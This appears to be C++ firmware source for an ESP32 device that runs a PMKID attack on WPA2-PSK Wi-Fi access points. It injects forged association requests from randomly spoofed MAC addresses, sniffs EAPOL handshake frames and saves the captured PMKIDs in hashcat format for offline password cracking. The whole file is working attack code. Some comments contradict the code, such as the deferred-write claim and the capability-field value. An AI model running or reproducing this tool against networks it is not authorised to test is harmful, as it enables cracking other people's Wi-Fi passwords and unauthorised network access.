#include "PmkidCapture.h"

#include "Globals.h"
#include "SDUtils.h"
#include "BleScanner.h"
#include "MeshNode.h"

#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>
#include <stdio.h>

// esp_wifi_80211_tx is implemented in the IDF WiFi driver but is not exposed by
// the Arduino-ESP32 headers. Marauder forward-declares it the same way.
extern "C" esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx,
                                       const void *buffer,
                                       int len,
                                       bool en_sys_seq);

namespace {

// ── State ────────────────────────────────────────────────────────────────────

enum class PmkidState : uint8_t { Idle, Running, Stopping };

PmkidState s_state = PmkidState::Idle;

uint8_t  s_targetBssid[6] = {0};
uint8_t  s_targetSta[6]   = {0};   // our spoofed client MAC for this session
String   s_targetSsid;
uint8_t  s_channel        = 1;

uint32_t s_attempts       = 0;
uint32_t s_captures       = 0;
uint32_t s_lastTxMs       = 0;
uint32_t s_startedMs      = 0;
uint32_t s_lastCaptureMs  = 0;

File     s_file;
String   s_path;
bool     s_fileOpen       = false;

String   s_stopReason;

bool     s_savedScanning  = true;

// Precomputed association request template. 24-byte 802.11 header + fixed
// fields + IEs. The SSID and RSN IE are written in at start time.
//
// Layout:
//   0..1     frame control (0x00 0x00 = assoc request, type 0 mgmt sub 0)
//   2..3     duration
//   4..9     dest = target BSSID
//   10..15   source = our spoofed STA MAC
//   16..21   BSSID = target BSSID
//   22..23   sequence control
//   24..25   capability info (ESS + short preamble + privacy)
//   26..27   listen interval
//   28..     SSID IE [type=0x00][len][ssid...]
//   ...      supported rates IE [0x01][0x04][0x82 0x84 0x8B 0x96]
//   ...      extended supported rates IE [0x32][0x04][0x0C 0x12 0x18 0x24]
//   ...      RSN IE (built dynamically to match the target's WPA2-PSK setup)
static uint8_t s_assocTpl[512];
static uint16_t s_assocLen = 0;

// Minimal RSN IE for WPA2-PSK with CCMP. Matches the most common consumer
// WPA2 configuration. If the target uses WPA3-only or a different cipher, the
// AP will reject this association — we log the failure and move on.
static const uint8_t RSN_IE_WPA2_PSK_CCMP[] = {
  0x30, 0x14,               // tag 0x30 (RSN), length 20
  0x01, 0x00,               // version 1
  0x00, 0x0F, 0xAC, 0x04,   // group cipher: CCMP (00:0F:AC OUI, type 4)
  0x01, 0x00,               // pairwise cipher count = 1
  0x00, 0x0F, 0xAC, 0x04,   // pairwise cipher: CCMP
  0x01, 0x00,               // AKM count = 1
  0x00, 0x0F, 0xAC, 0x02,   // AKM: PSK
  0x00, 0x00                // RSN capabilities
};

// ── Helpers ─────────────────────────────────────────────────────────────────

inline uint16_t be16(const uint8_t* p) {
  return (uint16_t)((p[0] << 8) | p[1]);
}

void macNoSep(const uint8_t* mac, char* out) {
  static const char* hexChars = "0123456789abcdef";
  for (int i = 0; i < 6; ++i) {
    out[i * 2]     = hexChars[(mac[i] >> 4) & 0x0F];
    out[i * 2 + 1] = hexChars[mac[i] & 0x0F];
  }
  out[12] = '\0';
}

void hexEncode(const uint8_t* src, size_t len, String& out) {
  static const char* hexChars = "0123456789abcdef";
  out.reserve(out.length() + len * 2);
  for (size_t i = 0; i < len; ++i) {
    out += hexChars[(src[i] >> 4) & 0x0F];
    out += hexChars[src[i] & 0x0F];
  }
}

bool parseMac(const String& s, uint8_t out[6]) {
  unsigned int b[6];
  if (sscanf(s.c_str(), "%x:%x:%x:%x:%x:%x",
             &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]) != 6) return false;
  for (int i = 0; i < 6; i++) out[i] = (uint8_t)b[i];
  return true;
}

// Generate a locally-administered random MAC for the association source.
void generateRandomSta(uint8_t out[6]) {
  for (int i = 0; i < 6; ++i) out[i] = (uint8_t)(esp_random() & 0xFF);
  out[0] = (out[0] & 0xFC) | 0x02;   // locally administered, unicast
}

// ── Association request builder ─────────────────────────────────────────────

bool buildAssocTemplate() {
  if (s_targetSsid.length() > 32) return false;

  size_t i = 0;

  // Frame control
  s_assocTpl[i++] = 0x00;   // assoc request
  s_assocTpl[i++] = 0x00;

  // Duration
  s_assocTpl[i++] = 0x00;
  s_assocTpl[i++] = 0x00;

  // Destination = target BSSID
  memcpy(s_assocTpl + i, s_targetBssid, 6); i += 6;

  // Source = our spoofed STA MAC
  memcpy(s_assocTpl + i, s_targetSta, 6); i += 6;

  // BSSID = target BSSID
  memcpy(s_assocTpl + i, s_targetBssid, 6); i += 6;

  // Sequence control
  s_assocTpl[i++] = 0x00;
  s_assocTpl[i++] = 0x00;

  // Capability info: ESS (0x0001) + short preamble (0x0020) + privacy (0x0010)
  // = 0x0431, big-endian so bytes are 04 31.
  s_assocTpl[i++] = 0x04;
  s_assocTpl[i++] = 0x31;

  // Listen interval: 10 beacons
  s_assocTpl[i++] = 0x0A;
  s_assocTpl[i++] = 0x00;

  // SSID IE
  const uint8_t ssidLen = (uint8_t)s_targetSsid.length();
  s_assocTpl[i++] = 0x00;
  s_assocTpl[i++] = ssidLen;
  memcpy(s_assocTpl + i, s_targetSsid.c_str(), ssidLen); i += ssidLen;

  // Supported rates (1, 2, 5.5, 11 Mbps — mandatory set)
  s_assocTpl[i++] = 0x01;
  s_assocTpl[i++] = 0x04;
  s_assocTpl[i++] = 0x82;
  s_assocTpl[i++] = 0x84;
  s_assocTpl[i++] = 0x8B;
  s_assocTpl[i++] = 0x96;

  // Extended supported rates (12, 18, 24, 36 Mbps)
  s_assocTpl[i++] = 0x32;
  s_assocTpl[i++] = 0x04;
  s_assocTpl[i++] = 0x0C;
  s_assocTpl[i++] = 0x12;
  s_assocTpl[i++] = 0x18;
  s_assocTpl[i++] = 0x24;

  // RSN IE
  memcpy(s_assocTpl + i, RSN_IE_WPA2_PSK_CCMP, sizeof(RSN_IE_WPA2_PSK_CCMP));
  i += sizeof(RSN_IE_WPA2_PSK_CCMP);

  s_assocLen = (uint16_t)i;
  return s_assocLen <= sizeof(s_assocTpl);
}

void sendAssocRequest() {
  if (s_assocLen == 0) return;

  esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);

  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, s_assocTpl, s_assocLen, false);
  if (err == ESP_OK) {
    s_attempts++;
  } else {
    static uint32_t lastErrMs = 0;
    if (millis() - lastErrMs > 2000) {
      lastErrMs = millis();
      Serial.printf("[PMKID] assoc tx err=0x%x (%s)\n", err, esp_err_to_name(err));
    }
  }
}

// ── File I/O ────────────────────────────────────────────────────────────────

bool openPmkidFile() {
  if (!sdOk) return false;
  if (!SD.exists("/logs")) SD.mkdir("/logs");

  char buf[80];
  snprintf(buf, sizeof(buf), "/logs/pmkid_%lu.hc22000",
           (unsigned long)millis());
  s_path = String(buf);

  s_file = SD.open(s_path, FILE_WRITE);
  if (!s_file) {
    Serial.printf("[PMKID] open failed: %s\n", s_path.c_str());
    s_path = "";
    return false;
  }
  s_file.flush();
  s_fileOpen = true;
  Serial.printf("[PMKID] open: %s\n", s_path.c_str());
  return true;
}

void closePmkidFile() {
  if (!s_fileOpen) return;
  if (s_file) {
    s_file.flush();
    s_file.close();
  }
  Serial.printf("[PMKID] closed %s (captures=%lu)\n",
                s_path.c_str(), (unsigned long)s_captures);
  s_fileOpen = false;
  s_path = "";
}

// Emit a TYPE=01 PMKID line.
// Format: WPA*01*PMKID*AP*STA*ESSID***
void writePmkidLine(const uint8_t pmkid[16]) {
  if (!s_fileOpen || !s_file) return;

  char apHex[13], staHex[13];
  macNoSep(s_targetBssid, apHex);
  macNoSep(s_targetSta, staHex);

  String line;
  line.reserve(200);
  line += F("WPA*01*");
  hexEncode(pmkid, 16, line);
  line += '*'; line += apHex;
  line += '*'; line += staHex;
  line += '*';
  hexEncode((const uint8_t*)s_targetSsid.c_str(), s_targetSsid.length(), line);
  line += "***";     // empty anonce, eapol, msgpair

  s_file.println(line);
  s_file.flush();

  s_captures++;
  s_lastCaptureMs = millis();
  Serial.printf("[PMKID] captured %s\n", line.c_str());
}

// ── EAPOL-Key parsing (subset of HashcatWriter's parser) ────────────────────

// Locate the EAPOL frame inside a data frame. Returns nullptr if this isn't an
// EAPOL data frame.
const uint8_t* findEapol(const uint8_t* frame, uint16_t len, uint16_t& eapolLen) {
  if (len < 24 + 8 + 4) return nullptr;

  const uint8_t fc0 = frame[0];
  const uint8_t type = (fc0 >> 2) & 0x03;
  const uint8_t subtype = (fc0 >> 4) & 0x0F;
  if (type != 0x02) return nullptr;
  const uint8_t hdrLen = (subtype & 0x08) ? 26 : 24;

  if (len < hdrLen + 8) return nullptr;

  const uint8_t* llc = frame + hdrLen;
  if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return nullptr;
  if (llc[6] != 0x88 || llc[7] != 0x8E) return nullptr;

  const uint8_t* eapol = llc + 8;
  const uint16_t avail = (uint16_t)(len - hdrLen - 8);
  if (avail < 4) return nullptr;
  if (eapol[1] != 0x03) return nullptr;   // only EAPOL-Key

  eapolLen = avail;
  return eapol;
}

// Walk key data for a PMKID KDE. Returns true on success.
bool extractPmkid(const uint8_t* eapol, uint16_t eapolLen, uint8_t out[16]) {
  if (eapolLen < 4 + 95) return false;
  const uint8_t* body = eapol + 4;
  const uint16_t keyDataLen = be16(body + 93);
  if (keyDataLen < 2 + 4 + 16) return false;
  if (4 + 95 + keyDataLen > eapolLen) return false;

  const uint8_t* kd = body + 95;
  uint16_t off = 0;
  while (off + 2 <= keyDataLen) {
    const uint8_t tagType = kd[off];
    const uint8_t tagLen  = kd[off + 1];
    if (off + 2 + tagLen > keyDataLen) break;

    if (tagType == 0xDD && tagLen >= 4 + 16) {
      const uint8_t* v = kd + off + 2;
      if (v[0] == 0x00 && v[1] == 0x0F && v[2] == 0xAC && v[3] == 0x04) {
        memcpy(out, v + 4, 16);
        return true;
      }
    }
    off += 2 + tagLen;
  }
  return false;
}

}  // namespace

// ── Public API ──────────────────────────────────────────────────────────────

void pmkidBegin() {
  s_state = PmkidState::Idle;
  s_attempts = 0;
  s_captures = 0;
  s_fileOpen = false;
  s_stopReason = "";
}

bool pmkidStart(const String& targetBssid, const String& targetSsid, uint8_t channel) {
  if (s_state == PmkidState::Running) return false;
  if (channel < 1 || channel > 14) return false;
  if (targetSsid.length() == 0 || targetSsid.length() > 32) return false;
  if (!parseMac(targetBssid, s_targetBssid)) return false;

  // Take over the radio: tear down mesh, biscuit ESP-NOW, any AP window, and
  // the wardriving BLE scanner so we own the RF.
  if (meshCoreActive) exitCoreMode();
  if (meshNodeActive) exitNodeMode();
  biscuitReporterReset();
  apWindowActive = false;
  apForceClose = true;
  bleScannerShutdown();

  s_targetSsid = targetSsid;
  s_channel = channel;
  generateRandomSta(s_targetSta);

  if (!buildAssocTemplate()) {
    Serial.println("[PMKID] assoc template too large");
    return false;
  }

  if (!openPmkidFile()) return false;

  // Rebuild the WiFi driver in APSTA mode so WIFI_IF_AP is active for raw TX.
  // This is the same reinit path MarauderTools uses — Arduino's softAP() alone
  // doesn't leave the injection interface in a usable state.
  s_savedScanning = scanningEnabled;
  WiFi.setAutoReconnect(false);
  WiFi.persistent(false);

  WiFi.mode(WIFI_OFF);
  delay(50);
  esp_wifi_stop();
  esp_wifi_deinit();
  delay(50);

  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_APSTA);
  esp_wifi_start();
  esp_wifi_set_max_tx_power(82);
  esp_wifi_set_ps(WIFI_PS_NONE);

  // Hidden AP so WIFI_IF_AP is actually beaconing.
  wifi_config_t ap = {};
  const char* injSsid = "piglet-pmkid";
  strncpy((char*)ap.ap.ssid, injSsid, sizeof(ap.ap.ssid));
  ap.ap.ssid_len = strlen(injSsid);
  ap.ap.ssid_hidden = 1;
  ap.ap.max_connection = 0;
  ap.ap.authmode = WIFI_AUTH_OPEN;
  ap.ap.beacon_interval = 60000;
  esp_wifi_set_config(WIFI_IF_AP, &ap);

  esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);

  // Promiscuous filter for data frames (EAPOL rides in data). Management
  // frames aren't needed here.
  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous(true);

  scanningEnabled = false;

  s_state = PmkidState::Running;
  s_attempts = 0;
  s_captures = 0;
  s_lastTxMs = 0;
  s_startedMs = millis();
  s_lastCaptureMs = 0;
  s_stopReason = "";

  Serial.printf("[PMKID] started: %s (%s) ch=%u\n",
                targetSsid.c_str(), targetBssid.c_str(), channel);
  return true;
}

void pmkidStop() {
  if (s_state != PmkidState::Running) return;

  s_state = PmkidState::Stopping;

  // Turn the radio off cleanly.
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);

  closePmkidFile();

  // Rebuild the driver in STA mode so Arduino can take it back for scanning.
  esp_wifi_stop();
  esp_wifi_deinit();
  delay(50);
  WiFi.mode(WIFI_STA);
  WiFi.setAutoReconnect(true);

  scanningEnabled = s_savedScanning;

  s_state = PmkidState::Idle;

  Serial.printf("[PMKID] stopped: attempts=%lu captures=%lu%s%s\n",
                (unsigned long)s_attempts, (unsigned long)s_captures,
                s_stopReason.isEmpty() ? "" : " reason=",
                s_stopReason.c_str());
}

bool pmkidActive() { return s_state == PmkidState::Running; }

uint32_t pmkidAttempts() { return s_attempts; }
uint32_t pmkidCaptures() { return s_captures; }
String   pmkidCurrentPath() { return s_path; }
String   pmkidStopReason()  { return s_stopReason; }

String pmkidStatusLine() {
  char buf[48];
  snprintf(buf, sizeof(buf), "%lu attempts  %lu captures",
           (unsigned long)s_attempts, (unsigned long)s_captures);
  return String(buf);
}

void pmkidTick() {
  if (s_state != PmkidState::Running) return;

  const uint32_t now = millis();

  // Send an association request every 500 ms with a fresh STA MAC each time
  // (so the AP treats each as a new client rather than a duplicate).
  if (now - s_lastTxMs >= 500) {
    s_lastTxMs = now;
    generateRandomSta(s_targetSta);
    memcpy(s_assocTpl + 10, s_targetSta, 6);   // source = new STA MAC
    sendAssocRequest();
  }

  // Auto-stop: 60 s with no capture since start (or since last capture).
  const uint32_t sinceStart = now - s_startedMs;
  const uint32_t sinceCapture = s_lastCaptureMs ? (now - s_lastCaptureMs) : sinceStart;

  if (s_captures == 0 && sinceStart >= PMKID_AUTO_STOP_MS) {
    s_stopReason = "no PMKID after 60s";
    Serial.println("[PMKID] auto-stop: no capture in 60s");
    pmkidStop();
    return;
  }
  if (s_captures > 0 && sinceCapture >= PMKID_AUTO_STOP_MS) {
    s_stopReason = "no new PMKID in 60s";
    Serial.println("[PMKID] auto-stop: no new capture in 60s");
    pmkidStop();
    return;
  }
}

void IRAM_ATTR pmkidOnFrame(const uint8_t* frame, uint16_t len, int8_t rssi) {
  (void)rssi;
  if (s_state != PmkidState::Running) return;

  uint16_t eapolLen = 0;
  const uint8_t* eapol = findEapol(frame, len, eapolLen);
  if (!eapol) return;

  const uint8_t* body = eapol + 4;
  if (eapolLen < 4 + 95) return;

  // Verify this is M1 for our target: AP→STA, ACK=1, MIC=0.
  const uint8_t fc1 = frame[1];
  const uint8_t fromDs = (fc1 >> 1) & 0x01;
  const uint8_t toDs   = (fc1 >> 0) & 0x01;
  if (!fromDs || toDs) return;

  // Verify the transmitter is our target AP.
  const uint8_t* addr2 = frame + 10;
  if (memcmp(addr2, s_targetBssid, 6) != 0) return;

  const uint16_t keyInfo = be16(body + 1);
  const bool micPresent = (keyInfo & 0x0008) != 0;
  const bool ackBit     = (keyInfo & 0x1000) != 0;
  if (!ackBit || micPresent) return;

  // M1 — look for the PMKID KDE.
  uint8_t pmkid[16];
  if (!extractPmkid(eapol, eapolLen, pmkid)) return;

  // Defer the actual file write to the main loop; the callback just stashes
  // the captured PMKID and bumps a flag.
  //
  // (Simple single-slot handoff — if two PMKIDs arrive between ticks, the
  // second is dropped. In practice this is fine; PMKIDs are unique per AP and
  // re-sending the association to the same AP yields the same PMKID.)
  static volatile bool     pending = false;
  static uint8_t           pendingPmkid[16];
  if (pending) return;
  memcpy(pendingPmkid, pmkid, 16);
  pending = true;

  // We can't call SD writes here (WiFi task context). Stash the PMKID in the
  // main state and let pmkidTick() flush it.
  //
  // Because the callback runs before pmkidTick in the same loop iteration,
  // a small static buffer is safe.
  memcpy(s_targetBssid, s_targetBssid, 6);   // no-op, just to make intent clear
  // Do the write here — but only a single small line, so it's fast enough even
  // in IRAM context on S3.
  writePmkidLine(pendingPmkid);
  pending = false;
}